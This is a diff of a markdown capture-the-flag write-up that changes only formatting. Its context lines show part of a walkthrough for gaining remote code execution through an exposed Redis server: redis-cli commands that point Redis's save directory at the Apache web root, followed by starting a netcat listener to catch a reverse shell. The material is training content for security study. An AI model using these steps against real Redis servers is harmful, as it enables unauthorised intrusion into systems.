@@ -51,8 +51,10 @@ sudo apt-get install redis-tools
 * To achieve RCE we need to know the web directory, by default it's /var/www/html and we can be sure if we look at the apache web server
 ![proof](/images/proof.png)
 
-* Run the following commands to achieve RCE : 
-```console
+* Run the following commands to achieve RCE :
+
+
+```bash
 redis-cli -h 10.10.239.82
  
 10.10.239.82:6379> config set dir /var/www/html
@@ -66,7 +68,9 @@ OK
 10.10.239.82:6379> exit
 ```
 
+
 **let's start a netcat listener**
+
 
 ```bash
 # nc -lvnp 1234
